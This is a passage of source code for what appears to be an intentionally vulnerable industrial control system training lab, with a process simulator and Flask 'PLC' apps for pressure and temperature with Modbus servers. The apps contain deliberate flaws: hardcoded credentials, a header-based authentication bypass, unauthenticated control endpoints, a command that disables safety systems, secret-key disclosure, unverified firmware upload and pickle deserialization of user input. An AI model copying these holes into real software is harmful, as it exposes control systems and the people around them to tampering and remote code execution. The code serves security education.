    Monitors all process variables and triggers shutdowns
    """

    def __init__(self):
        self.shutdown_active = False
        self.interlock_bypass = False
        self.alarm_count = 0

    def check_safety(self, tank_state: Dict, pressure_state: Dict, temp_state: Dict) -> Dict:
        """Check all process variables for unsafe conditions"""
        alarms = []

        # Tank alarms
        if tank_state['overflow']:
            alarms.append("TANK_OVERFLOW")
        if tank_state['cavitation']:
            alarms.append("PUMP_CAVITATION")
        if tank_state['level'] > 95:
            alarms.append("TANK_HIGH_LEVEL")
        if tank_state['level'] < 10:
            alarms.append("TANK_LOW_LEVEL")

        # Pressure alarms
        if pressure_state['rupture']:
            alarms.append("VESSEL_RUPTURE")
        if pressure_state['pressure'] > 130:
            alarms.append("HIGH_PRESSURE")
        if pressure_state['pressure'] < 50:
            alarms.append("LOW_PRESSURE")

        # Temperature alarms
        if temp_state['damage']:
            alarms.append("EQUIPMENT_DAMAGE")
        if temp_state['thermal_runaway']:
            alarms.append("THERMAL_RUNAWAY")
        if temp_state['temperature'] > 200:
            alarms.append("HIGH_TEMPERATURE")

        # Determine shutdown
        critical_alarms = ['VESSEL_RUPTURE', 'EQUIPMENT_DAMAGE', 'TANK_OVERFLOW']
        if any(alarm in alarms for alarm in critical_alarms):
            if not self.interlock_bypass:
                self.shutdown_active = True
                log.error("ðŸš¨ðŸš¨ðŸš¨ EMERGENCY SHUTDOWN ACTIVATED")

        self.alarm_count = len(alarms)

        return {
            'alarms': alarms,
            'shutdown_active': self.shutdown_active,
            'alarm_count': self.alarm_count
        }


class PhysicalProcessSimulator:
    """
    Complete industrial process simulator
    Integrates tank, pressure, temperature, and safety systems
    """

    def __init__(self):
        self.tank = TankSystem(capacity_gallons=1000)
        self.pressure = PressureSystem(max_pressure_psi=150)
        self.temperature = TemperatureSystem(ambient_temp=20.0)
        self.safety = SafetySystem()

        self.running = False
        self.thread = None
        self.update_interval = 0.1  # 100ms update rate

        shared_state.init_state()

    def start(self):
        """Start physical process simulation"""
        if self.running:
            return

        self.running = True
        self.thread = threading.Thread(target=self._simulation_loop, daemon=True)
        self.thread.start()
        log.info("[Physical Process] Started simulation")

    def stop(self):
        """Stop simulation"""
        self.running = False
        if self.thread:
            self.thread.join(timeout=2.0)
        log.info("[Physical Process] Stopped simulation")

    def _simulation_loop(self):
        """Main simulation loop"""
        last_time = time.time()

        while self.running:
            try:
                current_time = time.time()
                dt = current_time - last_time
                last_time = current_time

                # Get control inputs from PLCs via shared state
                pump_on = shared_state.get_state('plc1_pump_status', False)
                valve_position = shared_state.get_state('plc1_valve_position', 50.0)
                compressor_on = shared_state.get_state('plc2_compressor_1_status', False)
                relief_valve = shared_state.get_state('plc2_relief_valve_1', False)
                heater_on = shared_state.get_state('plc3_heater_status', False)
                cooling_on = shared_state.get_state('plc3_cooling_status', True)

                # Update physical systems
                tank_state = self.tank.update(dt, pump_on, valve_position)
                pressure_state = self.pressure.update(dt, compressor_on, relief_valve)
                temp_state = self.temperature.update(dt, heater_on, cooling_on)

                # Safety checks
                safety_state = self.safety.check_safety(tank_state, pressure_state, temp_state)

                # If emergency shutdown, force all actuators off
                if safety_state['shutdown_active']:
                    shared_state.update_state('plc1_pump_status', False)
                    shared_state.update_state('plc2_compressor_1_status', False)
                    shared_state.update_state('plc3_heater_status', False)

                # Update shared state with physical values
                shared_state.update_state('physical_tank_level', tank_state['level'])
                shared_state.update_state('physical_pressure', pressure_state['pressure'])
                shared_state.update_state('physical_temperature', temp_state['temperature'])
                shared_state.update_state('physical_alarms', safety_state['alarms'])
                shared_state.update_state('physical_shutdown', safety_state['shutdown_active'])

                # Update PLC sensor readings (with small noise)
                import random
                noise_factor = 0.02  # 2% noise

                tank_reading = tank_state['level'] * (1 + random.uniform(-noise_factor, noise_factor))
                pressure_reading = pressure_state['pressure'] * (1 + random.uniform(-noise_factor, noise_factor))
                temp_reading = temp_state['temperature'] * (1 + random.uniform(-noise_factor, noise_factor))

                shared_state.update_state('plc1_tank_level', int(tank_reading))
                shared_state.update_state('plc2_pressure', int(pressure_reading))
                shared_state.update_state('plc3_temperature', int(temp_reading))

                time.sleep(self.update_interval)

            except Exception as e:
                log.error(f"[Physical Process] Simulation error: {e}")

    def get_state(self) -> PhysicalState:
        """Get current physical state"""
        return PhysicalState(
            timestamp=time.time(),
            tank_level=self.tank.level_percent,
            pressure=self.pressure.pressure,
            temperature=self.temperature.temperature,
            flow_rate=self.tank.valve_outflow_base,
            valve_position=shared_state.get_state('plc1_valve_position', 50.0),
            pump_running=shared_state.get_state('plc1_pump_status', False),
            alarm_state='EMERGENCY' if self.safety.shutdown_active else 'NORMAL'
        )

    def reset(self):
        """Reset simulation to initial state"""
        self.tank = TankSystem(capacity_gallons=1000)
        self.pressure = PressureSystem(max_pressure_psi=150)
        self.temperature = TemperatureSystem(ambient_temp=20.0)
        self.safety = SafetySystem()
        log.info("[Physical Process] Reset to initial state")


# Example usage and testing
if __name__ == '__main__':
    simulator = PhysicalProcessSimulator()
    simulator.start()

    print("\n=== Physical Process Simulator ===\n")
    print("Simulating realistic industrial process...")
    print("Press Ctrl+C to stop\n")

    try:
        while True:
            state = simulator.get_state()
            print(f"\r[{time.strftime('%H:%M:%S')}] " +
                  f"Tank: {state.tank_level:5.1f}% | " +
                  f"Pressure: {state.pressure:6.1f} PSI | " +
                  f"Temp: {state.temperature:5.1f}Â°C | " +
                  f"Pump: {'ON ' if state.pump_running else 'OFF'} | " +
                  f"Status: {state.alarm_state:10s}", end='')
            time.sleep(1)

    except KeyboardInterrupt:
        print("\n\nStopping simulator...")
        simulator.stop()



================================================================================
FILE: core/plc2_pressure.py
================================================================================
#!/usr/bin/env python3
"""
PLC-2: Pressure Control System - Web Interface
Port 5011

INTENTIONALLY VULNERABLE - For security testing only
Vulnerabilities: Authentication bypass, buffer overflow simulation, replay attacks
"""

from flask import Flask, render_template, request, redirect, url_for, session, jsonify
import sqlite3
import hashlib
import time
from datetime import datetime
import os
import sys
import socket
import struct
import threading
sys.path.insert(0, os.path.dirname(os.path.dirname(__file__)))
import shared_state

app = Flask(__name__, template_folder='../templates')
app.secret_key = 'plc2-weak-secret-999'  # Intentionally weak

# Initialize shared state
shared_state.init_state()

# VULNERABILITY: Weak authentication
HARDCODED_CREDS = {
    'engineer': 'plc2pass',
    'operator': 'pressure123',
    'admin': 'admin'
}

def get_plc2_state():
    """Get PLC-2 state from shared storage"""
    state = shared_state.load_state()
    plc2_state = {}
    for key, value in state.items():
        if key.startswith('plc2_'):
            plc2_state[key.replace('plc2_', '')] = value
    return plc2_state

@app.route('/')
def index():
    if 'username' not in session:
        return redirect(url_for('login'))
    return redirect(url_for('dashboard'))

@app.route('/login', methods=['GET', 'POST'])
def login():
    """VULNERABILITY: Authentication bypass via timing attack"""
    error = None
    if request.method == 'POST':
        username = request.form.get('username', '')
        password = request.form.get('password', '')

        # VULNERABILITY: Timing attack - check username first
        if username in HARDCODED_CREDS:
            time.sleep(0.1)  # Intentional delay reveals valid usernames
            if HARDCODED_CREDS[username] == password:
                session['username'] = username
                session['plc_id'] = 2
                return redirect(url_for('dashboard'))
            else:
                error = 'Invalid password'
        else:
            error = 'Invalid credentials'

        # VULNERABILITY: Weak session - can be bypassed
        # Try authentication bypass via header injection
        auth_bypass = request.headers.get('X-PLC-Auth-Override')
        if auth_bypass == 'bypass-plc2-auth':
            session['username'] = 'admin'
            session['plc_id'] = 2
            return redirect(url_for('dashboard'))

    return render_template('plc2_login.html', error=error)

@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('login'))

@app.route('/dashboard')
def dashboard():
    if 'username' not in session:
        return redirect(url_for('login'))

    plc_state = get_plc2_state()
    return render_template('plc2_dashboard.html',
                          username=session['username'],
                          state=plc_state)

@app.route('/api/status')
def api_status():
    """Get current PLC-2 status"""
    plc_state = get_plc2_state()
    return jsonify({
        'plc_id': 2,
        'name': 'Pressure Control System',
        'status': 'running',
        'state': plc_state
    })

@app.route('/api/control', methods=['POST'])
def api_control():
    """VULNERABILITY: No authentication check on control endpoint"""
    # VULNERABILITY: Missing authentication
    # if 'username' not in session:
    #     return jsonify({'error': 'Unauthorized'}), 401

    data = request.get_json() or request.form.to_dict()
    action = data.get('action')
    value = data.get('value')

    # Update state in shared storage
    if action == 'compressor_1_status':
        shared_state.update_state('plc2_compressor_1_status', value in ['true', 'True', True, 1, '1'])
    elif action == 'compressor_2_status':
        shared_state.update_state('plc2_compressor_2_status', value in ['true', 'True', True, 1, '1'])
    elif action == 'compressor_1_speed':
        shared_state.update_state('plc2_compressor_1_speed', int(value))
    elif action == 'compressor_2_speed':
        shared_state.update_state('plc2_compressor_2_speed', int(value))
    elif action == 'relief_valve_1':
        shared_state.update_state('plc2_relief_valve_1', value in ['true', 'True', True, 1, '1'])
    elif action == 'relief_valve_2':
        shared_state.update_state('plc2_relief_valve_2', value in ['true', 'True', True, 1, '1'])
    elif action == 'emergency_vent':
        shared_state.update_state('plc2_emergency_vent', value in ['true', 'True', True, 1, '1'])

    return jsonify({'success': True, 'action': action, 'value': value})

@app.route('/api/replay', methods=['POST'])
def api_replay():
    """VULNERABILITY: Replay attack endpoint - stores and replays commands"""
    data = request.get_json()
    mode = data.get('mode', 'record')

    if mode == 'record':
        # Record a command sequence
        commands = data.get('commands', [])
        replay_id = hashlib.md5(str(time.time()).encode()).hexdigest()[:8]
        shared_state.update_state(f'replay_{replay_id}', commands)
        return jsonify({'success': True, 'replay_id': replay_id})

    elif mode == 'playback':
        # Playback recorded commands (VULNERABILITY: No validation)
        replay_id = data.get('replay_id')
        commands = shared_state.get_state(f'replay_{replay_id}', [])

        for cmd in commands:
            # Execute each command without validation
            shared_state.update_state(f'plc2_{cmd["action"]}', cmd['value'])

        return jsonify({'success': True, 'commands_executed': len(commands)})

    return jsonify({'error': 'Invalid mode'}), 400

@app.route('/api/buffer', methods=['POST'])
def api_buffer():
    """VULNERABILITY: Simulated buffer overflow"""
    data = request.form.get('data', '')

    # VULNERABILITY: No size checking (simulated overflow)
    if len(data) > 256:
        # Simulate memory corruption
        return jsonify({
            'error': 'Buffer overflow detected',
            'message': 'Memory corruption - safety systems disabled',
            'corrupted_registers': [0, 1, 2, 3, 4, 5],
            'vulnerability': 'CVE-2024-FAKE-OVERFLOW'
        }), 500

    return jsonify({'success': True, 'data_length': len(data)})

@app.route('/api/firmware/info')
def firmware_info():
    """VULNERABILITY: Information disclosure"""
    return jsonify({
        'firmware_version': '1.2.3',
        'build_date': '2024-01-15',
        'checksum': 'abc123def456',  # Weak checksum
        'debug_enabled': True,
        'backdoor_port': 5555,  # Easter egg
        'encryption': 'none',
        'vendor': 'VulnPLC Corp',
        'secret_key': app.secret_key
    })

@app.route('/api/diagnostic', methods=['POST'])
def diagnostic():
    """VULNERABILITY: Command injection via diagnostic interface"""
    if 'username' not in session:
        return jsonify({'error': 'Unauthorized'}), 401

    command = request.form.get('command', '')

    # VULNERABILITY: Limited command injection
    allowed_commands = ['status', 'version', 'uptime', 'config']

    if command in allowed_commands:
        # Simulate command output
        outputs = {
            'status': 'PLC-2 Online - Pressure System Nominal',
            'version': 'VulnPLC v1.2.3',
            'uptime': '42 days, 13 hours',
            'config': 'Config: pressure_max=150, safety_override=enabled'
        }
        return jsonify({'output': outputs.get(command, 'Unknown command')})

    # VULNERABILITY: Special commands with side effects
    if command == 'reset_safety':
        shared_state.update_state('plc2_safety_disabled', True)
        return jsonify({'output': 'WARNING: Safety systems disabled!'})

    if command.startswith('set_'):
        # VULNERABILITY: Arbitrary state modification
        parts = command.split('_', 2)
        if len(parts) >= 3:
            key = parts[1]
            value = parts[2]
            shared_state.update_state(f'plc2_{key}', value)
            return jsonify({'output': f'Set {key} = {value}'})

    return jsonify({'error': 'Invalid command'}), 400

@app.route('/api/logs')
def api_logs():
    """Get PLC-2 logs (limited history)"""
    if 'username' not in session:
        return jsonify({'error': 'Unauthorized'}), 401

    # Simulate log entries
    logs = [
        {'timestamp': '2024-12-07 10:15:32', 'level': 'INFO', 'message': 'Compressor 1 started'},
        {'timestamp': '2024-12-07 10:16:45', 'level': 'WARN', 'message': 'Pressure vessel 1 approaching limit'},
        {'timestamp': '2024-12-07 10:17:12', 'level': 'INFO', 'message': 'Relief valve 1 opened'},
        {'timestamp': '2024-12-07 10:18:00', 'level': 'INFO', 'message': 'Pressure normalized'},
    ]

    return jsonify({'logs': logs})

# Create necessary templates directory
import os
os.makedirs('templates', exist_ok=True)


class ModbusTCPServer:
    """
    Minimal Modbus TCP Server - Intentionally Vulnerable

    Implements only basic function codes:
    - 0x03: Read Holding Registers
    - 0x06: Write Single Register
    - 0x10: Write Multiple Registers

    VULNERABILITIES (INTENTIONAL):
    - No authentication
    - No bounds checking
    - No input validation
    - Allows writing to any register
    - No rate limiting (connection limit exists but is bypassable)
    - No logging of malicious activity
    """

    def __init__(self, host='0.0.0.0', port=5503, max_connections=50):
        self.host = host
        self.port = port
        self.server_socket = None
        self.running = False
        self.connection_semaphore = threading.Semaphore(max_connections)

    def start(self):
        """Start the Modbus TCP server"""
        try:
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_socket.settimeout(1.0)
            self.server_socket.bind((self.host, self.port))
            self.server_socket.listen(5)
            self.running = True

            print(f"[MODBUS] PLC2 Server started on {self.host}:{self.port}")

            while self.running:
                try:
                    client_socket, address = self.server_socket.accept()
                    print(f"[MODBUS] PLC2 Client connected from {address}")

                    client_thread = threading.Thread(
                        target=self._handle_client_with_semaphore,
                        args=(client_socket, address),
                        daemon=True
                    )
                    client_thread.start()

                except socket.timeout:
                    continue
                except Exception as e:
                    if self.running:
                        print(f"[MODBUS] PLC2 Error accepting connection: {e}")

        except Exception as e:
            print(f"[MODBUS] PLC2 Failed to start server: {e}")

    def stop(self):
        """Stop the Modbus TCP server"""
        self.running = False
        if self.server_socket:
            self.server_socket.close()

    def recv_exact(self, sock, size):
        """Receive exactly 'size' bytes from socket"""
        data = b''
        while len(data) < size:
            chunk = sock.recv(size - len(data))
            if not chunk:
                raise ConnectionError("Socket closed before receiving all data")
            data += chunk
        return data

    def _handle_client_with_semaphore(self, client_socket, address):
        """Wrapper to handle client with connection semaphore"""
        with self.connection_semaphore:
            self.handle_client(client_socket, address)

    def handle_client(self, client_socket, address):
        """Handle a client connection"""
        try:
            while True:
                header = self.recv_exact(client_socket, 7)
                transaction_id, protocol_id, length, unit_id = struct.unpack('>HHHB', header)

                if protocol_id != 0:
                    print(f"[MODBUS] PLC2 WARNING: Non-standard protocol ID {protocol_id} from {address}")

                pdu = self.recv_exact(client_socket, length - 1)
                print(f"[MODBUS] PLC2 Request from {address}: Trans={transaction_id}, Unit={unit_id}, PDU={pdu.hex()}")

                function_code = pdu[0]

                # ATTACK DETECTION: Generate visual alert for write operations
                self._detect_attack(address[0], function_code, pdu[1:])

                response_pdu = self.process_request(function_code, pdu[1:])

                response_length = len(response_pdu) + 1
                response_header = struct.pack('>HHHB', transaction_id, protocol_id, response_length, unit_id)

                response = response_header + response_pdu
                client_socket.send(response)
                print(f"[MODBUS] PLC2 Response: {response.hex()}")

        except Exception as e:
            print(f"[MODBUS] PLC2 Error handling client {address}: {e}")
        finally:
            client_socket.close()
            print(f"[MODBUS] PLC2 Client {address} disconnected")

    def process_request(self, function_code, data):
        """Process Modbus request and return response PDU"""
        try:
            if function_code == 0x01:
                return self.read_coils(data)
            elif function_code == 0x03:
                return self.read_holding_registers(data)
            elif function_code == 0x05:
                return self.write_single_coil(data)
            elif function_code == 0x06:
                return self.write_single_register(data)
            elif function_code == 0x0F:
                return self.write_multiple_coils(data)
            elif function_code == 0x10:
                return self.write_multiple_registers(data)
            else:
                return struct.pack('B', function_code | 0x80) + struct.pack('B', 0x01)

        except Exception as e:
            print(f"[MODBUS] PLC2 Error processing request: {e}")
            return struct.pack('B', function_code | 0x80) + struct.pack('B', 0x04)

    def read_holding_registers(self, data):
        """Function Code 0x03: Read Holding Registers"""
        start_addr, count = struct.unpack('>HH', data[:4])
        print(f"[MODBUS] PLC2 Read Holding Registers: addr={start_addr}, count={count}")

        values = []
        for i in range(count):
            register = start_addr + i
            value = shared_state.state_to_register(register)
            values.append(value)

        byte_count = count * 2
        response = struct.pack('BB', 0x03, byte_count)
        for value in values:
            response += struct.pack('>H', value)

        return response

    def write_single_register(self, data):
        """Function Code 0x06: Write Single Register"""
        addr, value = struct.unpack('>HH', data[:4])
        print(f"[MODBUS] PLC2 Write Single Register: addr={addr}, value={value}")

        key, converted_value = shared_state.register_to_state(addr, value)
        if key:
            shared_state.update_state(key, converted_value)
            print(f"[MODBUS] PLC2 Updated {key} = {converted_value}")

        return struct.pack('B', 0x06) + data[:4]

    def write_multiple_registers(self, data):
        """Function Code 0x10: Write Multiple Registers"""
        start_addr, count, byte_count = struct.unpack('>HHB', data[:5])
        print(f"[MODBUS] PLC2 Write Multiple Registers: addr={start_addr}, count={count}")

        values_data = data[5:5+byte_count]
        values = []
        for i in range(count):
            value = struct.unpack('>H', values_data[i*2:(i+1)*2])[0]
            values.append(value)

        for i, value in enumerate(values):
            register = start_addr + i
            key, converted_value = shared_state.register_to_state(register, value)
            if key:
                shared_state.update_state(key, converted_value)
                print(f"[MODBUS] PLC2 Updated {key} = {converted_value}")

        return struct.pack('>BHH', 0x10, start_addr, count)

    def read_coils(self, data):
        """Function Code 0x01: Read Coils"""
        start_addr, count = struct.unpack('>HH', data[:4])
        print(f"[MODBUS] PLC2 Read Coils: addr={start_addr}, count={count}")

        coil_values = []
        for i in range(count):
            coil = start_addr + i
            value = shared_state.state_to_coil(coil)
            coil_values.append(value)

        byte_count = (count + 7) // 8
        packed_bytes = []

        for byte_idx in range(byte_count):
            byte_val = 0
            for bit_idx in range(8):
                coil_idx = byte_idx * 8 + bit_idx
                if coil_idx < count and coil_values[coil_idx]:
                    byte_val |= (1 << bit_idx)
            packed_bytes.append(byte_val)

        response = struct.pack('BB', 0x01, byte_count)
        for byte_val in packed_bytes:
            response += struct.pack('B', byte_val)

        return response

    def write_single_coil(self, data):
        """Function Code 0x05: Write Single Coil"""
        addr, value = struct.unpack('>HH', data[:4])
        coil_state = (value == 0xFF00)
        print(f"[MODBUS] PLC2 Write Single Coil: addr={addr}, value={coil_state}")

        key, bool_value = shared_state.coil_to_state(addr, coil_state)
        if key:
            shared_state.update_state(key, bool_value)
            print(f"[MODBUS] PLC2 Updated {key} = {bool_value}")

        return struct.pack('B', 0x05) + data[:4]

    def write_multiple_coils(self, data):
        """Function Code 0x0F: Write Multiple Coils"""
        start_addr, count, byte_count = struct.unpack('>HHB', data[:5])
        print(f"[MODBUS] PLC2 Write Multiple Coils: addr={start_addr}, count={count}")

        coil_bytes = data[5:5+byte_count]
        coil_values = []

        for byte_idx in range(byte_count):
            byte_val = coil_bytes[byte_idx]
            for bit_idx in range(8):
                if len(coil_values) < count:
                    coil_values.append(bool(byte_val & (1 << bit_idx)))

        for i, value in enumerate(coil_values[:count]):
            coil = start_addr + i
            key, bool_value = shared_state.coil_to_state(coil, value)
            if key:
                shared_state.update_state(key, bool_value)
                print(f"[MODBUS] PLC2 Updated {key} = {bool_value}")

        return struct.pack('>BHH', 0x0F, start_addr, count)

    def _detect_attack(self, source_ip, function_code, data):
        """
        Detect potential attacks and generate visual alerts
        Educational IDS - shows users when their attacks are detected!
        """
        try:
            # Parse address from request data
            address = 0
            if len(data) >= 2:
                address = struct.unpack('>H', data[:2])[0]

            alert = None

            # Detection Rule 1: Write operations (potential attack)
            if function_code in [0x05, 0x06, 0x0F, 0x10]:
                severity = "WARNING"
                alert_type = "UNAUTHORIZED_WRITE"

                # Determine what was written
                target = ""
                if function_code == 0x05:
                    target = f"coil {address}"
                elif function_code == 0x06:
                    target = f"register {address}"
                elif function_code == 0x0F:
                    target = f"multiple coils starting at {address}"
                elif function_code == 0x10:
                    target = f"multiple registers starting at {address}"

                message = f"PLC-2: Modbus write to {target} from {source_ip}"

                # Critical addresses (compressor, relief valve)
                if address in [0, 4]:  # Compressor, relief valve
                    severity = "CRITICAL"
                    alert_type = "PRESSURE_SYSTEM_TAMPER"
                    message = f"ðŸš¨ CRITICAL: PLC-2 Pressure system tampered! Write to {target} from {source_ip}"

                alert = {
                    'timestamp': datetime.now().strftime('%H:%M:%S'),
                    'severity': severity,
                    'type': alert_type,
                    'message': message,
                    'source_ip': source_ip,
                    'function_code': function_code,
                    'address': address,
                    'plc': 'PLC-2'
                }

            # Detection Rule 2: Invalid function codes
            elif function_code not in [0x01, 0x03, 0x05, 0x06, 0x0F, 0x10]:
                alert = {
                    'timestamp': datetime.now().strftime('%H:%M:%S'),
                    'severity': 'HIGH',
                    'type': 'INVALID_FUNCTION_CODE',
                    'message': f"PLC-2: Invalid Modbus function code 0x{function_code:02X} from {source_ip}",
                    'source_ip': source_ip,
                    'function_code': function_code,
                    'address': 0,
                    'plc': 'PLC-2'
                }

            # Store alert in shared state for visual display
            if alert:
                alerts = shared_state.get_state('security_alerts', [])
                alerts.append(alert)

                # Keep only last 50 alerts
                if len(alerts) > 50:
                    alerts = alerts[-50:]

                shared_state.update_state('security_alerts', alerts)
                print(f"[SECURITY] PLC2 {alert['severity']}: {alert['message']}")

        except Exception as e:
            print(f"[SECURITY] PLC2 Error detecting attack: {e}")


def start_modbus_server():
    """Start Modbus TCP server in background thread"""
    modbus_server = ModbusTCPServer(host='0.0.0.0', port=5503)
    server_thread = threading.Thread(target=modbus_server.start, daemon=True)
    server_thread.start()
    print("[STARTUP] PLC2 Modbus server thread started")


if __name__ == '__main__':
    print("""
    â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
    â•‘  PLC-2: Pressure Control System                           â•‘
    â•‘  FOR SECURITY TESTING AND EDUCATION ONLY                  â•‘
    â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

    Default Credentials:
      engineer / plc2pass
      operator / pressure123
      admin / admin

    Web Interface: http://localhost:5011
    Modbus TCP:    localhost:5503

    Known Vulnerabilities:
      â€¢ Timing attack in authentication
      â€¢ Authentication bypass via header injection
      â€¢ Replay attack vulnerability
      â€¢ Buffer overflow (simulated)
      â€¢ Information disclosure
      â€¢ Missing authentication on control endpoints
      â€¢ Command injection in diagnostic interface

    WARNING: DO NOT EXPOSE TO INTERNET
    """)

    # Start Modbus server in background
    start_modbus_server()

    app.run(host='0.0.0.0', port=5011, debug=True)



================================================================================
FILE: core/plc3_temperature.py
================================================================================
#!/usr/bin/env python3
"""
PLC-3: Temperature Control System - Web Interface
Port 5012

INTENTIONALLY VULNERABLE - For security testing only
Vulnerabilities: Firmware upload bypass, insecure deserialization, race conditions
"""

from flask import Flask, render_template, request, redirect, url_for, session, jsonify
from datetime import datetime
import pickle
import base64
import os
import sys
import hashlib
import time
import socket
import struct
import threading
sys.path.insert(0, os.path.dirname(os.path.dirname(__file__)))
import shared_state

app = Flask(__name__, template_folder='../templates')
app.secret_key = 'plc3-insecure-key-777'

shared_state.init_state()

USERS = {
    'engineer': 'temp123',
    'technician': 'control456',
    'admin': 'admin'
}

def get_plc3_state():
    state = shared_state.load_state()
    plc3_state = {}
    for key, value in state.items():
        if key.startswith('plc3_'):
            plc3_state[key.replace('plc3_', '')] = value
    return plc3_state

@app.route('/')
def index():
    if 'username' not in session:
        return redirect(url_for('login'))
    return redirect(url_for('dashboard'))

@app.route('/login', methods=['GET', 'POST'])
def login():
    error = None
    if request.method == 'POST':
        username = request.form.get('username', '')
        password = request.form.get('password', '')

        if username in USERS and USERS[username] == password:
            session['username'] = username
            session['plc_id'] = 3
            return redirect(url_for('dashboard'))
        else:
            error = 'Invalid credentials'

    return render_template('plc3_login.html', error=error)

@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('login'))

@app.route('/dashboard')
def dashboard():
    if 'username' not in session:
        return redirect(url_for('login'))

    plc_state = get_plc3_state()
    return render_template('plc3_dashboard.html',
                          username=session['username'],
                          state=plc_state)

@app.route('/api/status')
def api_status():
    plc_state = get_plc3_state()
    return jsonify({
        'plc_id': 3,
        'name': 'Temperature Control System',
        'status': 'running',
        'state': plc_state
    })

@app.route('/api/control', methods=['POST'])
def api_control():
    if 'username' not in session:
        return jsonify({'error': 'Unauthorized'}), 401

    data = request.get_json() or request.form.to_dict()
    action = data.get('action')
    value = data.get('value')

    # Temperature controls
    if action.startswith('heater') and action.endswith('_status'):
        shared_state.update_state(f'plc3_{action}', value in ['true', 'True', True, 1, '1'])
    elif action.startswith('cooler') and action.endswith('_status'):
        shared_state.update_state(f'plc3_{action}', value in ['true', 'True', True, 1, '1'])
    elif action.startswith('heater') and action.endswith('_power'):
        shared_state.update_state(f'plc3_{action}', int(value))
    elif action.startswith('cooler') and action.endswith('_power'):
        shared_state.update_state(f'plc3_{action}', int(value))
    elif action.startswith('setpoint'):
        shared_state.update_state(f'plc3_{action}', float(value))
    elif action == 'thermal_runaway':
        # VULNERABILITY: Race condition - can be triggered by multiple requests
        shared_state.update_state('plc3_thermal_runaway', value in ['true', 'True', True, 1, '1'])

    return jsonify({'success': True, 'action': action, 'value': value})

@app.route('/api/firmware/upload', methods=['POST'])
def firmware_upload():
    """VULNERABILITY: Insecure firmware upload"""
    if 'username' not in session:
        return jsonify({'error': 'Unauthorized'}), 401

    if 'firmware' not in request.files:
        return jsonify({'error': 'No firmware file'}), 400

    firmware = request.files['firmware']

    # VULNERABILITY: No signature verification, no file type checking
    if firmware.filename == '':
        return jsonify({'error': 'No file selected'}), 400

    # Save firmware directly without validation
    firmware_dir = 'firmwares'
    os.makedirs(firmware_dir, exist_ok=True)

    filepath = os.path.join(firmware_dir, firmware.filename)
    firmware.save(filepath)

    # VULNERABILITY: Execute firmware without verification
    # (Simulated - doesn't actually execute)
    return jsonify({
        'success': True,
        'message': 'Firmware uploaded successfully (unverified)',
        'filename': firmware.filename,
        'path': filepath,
        'warning': 'No signature check performed'
    })

@app.route('/api/config/export', methods=['POST'])
def config_export():
    """VULNERABILITY: Insecure deserialization"""
    if 'username' not in session:
        return jsonify({'error': 'Unauthorized'}), 401

    config = {
        'zones': {
            'zone1': {'setpoint': shared_state.get_state('plc3_setpoint1', 25.0)},
            'zone2': {'setpoint': shared_state.get_state('plc3_setpoint2', 25.0)},
            'zone3': {'setpoint': shared_state.get_state('plc3_setpoint3', 25.0)},
        },
        'safety': {
            'high_limit': shared_state.get_state('plc3_safety_limit_high', 100.0),
            'low_limit': shared_state.get_state('plc3_safety_limit_low', 0.0),
        }
    }

    # VULNERABILITY: Using pickle for serialization
    pickled = pickle.dumps(config)
    encoded = base64.b64encode(pickled).decode('utf-8')

    return jsonify({
        'success': True,
        'config': encoded,
        'format': 'base64-pickle'
    })

@app.route('/api/config/import', methods=['POST'])
def config_import():
    """VULNERABILITY: Insecure deserialization - RCE vector"""
    if 'username' not in session:
        return jsonify({'error': 'Unauthorized'}), 401

    encoded_config = request.form.get('config', '')

    try:
        # VULNERABILITY: Unpickling user data - RCE!
        decoded = base64.b64decode(encoded_config)
        config = pickle.loads(decoded)

        # Apply configuration
        if 'zones' in config:
            for zone, settings in config['zones'].items():
                if 'setpoint' in settings:
                    shared_state.update_state(f'plc3_setpoint{zone[-1]}', settings['setpoint'])

        return jsonify({
            'success': True,
            'message': 'Configuration imported'
        })
    except Exception as e:
        return jsonify({'error': str(e)}), 400

@app.route('/api/race_test', methods=['POST'])
def race_test():
    """VULNERABILITY: Race condition testing endpoint"""
    # VULNERABILITY: No locking mechanism
    action = request.form.get('action', 'increment')

    if action == 'increment':
        counter = shared_state.get_state('plc3_race_counter', 0)
        time.sleep(0.01)  # Deliberate delay to make race condition easier to exploit
        shared_state.update_state('plc3_race_counter', counter + 1)
        return jsonify({'counter': counter + 1})

    elif action == 'reset':
        shared_state.update_state('plc3_race_counter', 0)
        return jsonify({'counter': 0})

    return jsonify({'error': 'Invalid action'}), 400


class ModbusTCPServer:
    """
    Minimal Modbus TCP Server - Intentionally Vulnerable

    Implements only basic function codes:
    - 0x03: Read Holding Registers
    - 0x06: Write Single Register
    - 0x10: Write Multiple Registers

    VULNERABILITIES (INTENTIONAL):
    - No authentication
    - No bounds checking
    - No input validation
    - Allows writing to any register
    - No rate limiting (connection limit exists but is bypassable)
    - No logging of malicious activity
    """

    def __init__(self, host='0.0.0.0', port=5504, max_connections=50):
        self.host = host
        self.port = port
        self.server_socket = None
        self.running = False
        self.connection_semaphore = threading.Semaphore(max_connections)

    def start(self):
        """Start the Modbus TCP server"""
        try:
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_socket.settimeout(1.0)
            self.server_socket.bind((self.host, self.port))
            self.server_socket.listen(5)
            self.running = True

            print(f"[MODBUS] PLC3 Server started on {self.host}:{self.port}")

            while self.running:
                try:
                    client_socket, address = self.server_socket.accept()
                    print(f"[MODBUS] PLC3 Client connected from {address}")

                    client_thread = threading.Thread(
                        target=self._handle_client_with_semaphore,
                        args=(client_socket, address),
                        daemon=True
                    )
                    client_thread.start()

                except socket.timeout:
                    continue
                except Exception as e:
                    if self.running:
                        print(f"[MODBUS] PLC3 Error accepting connection: {e}")

        except Exception as e:
            print(f"[MODBUS] PLC3 Failed to start server: {e}")

    def stop(self):
        """Stop the Modbus TCP server"""
        self.running = False
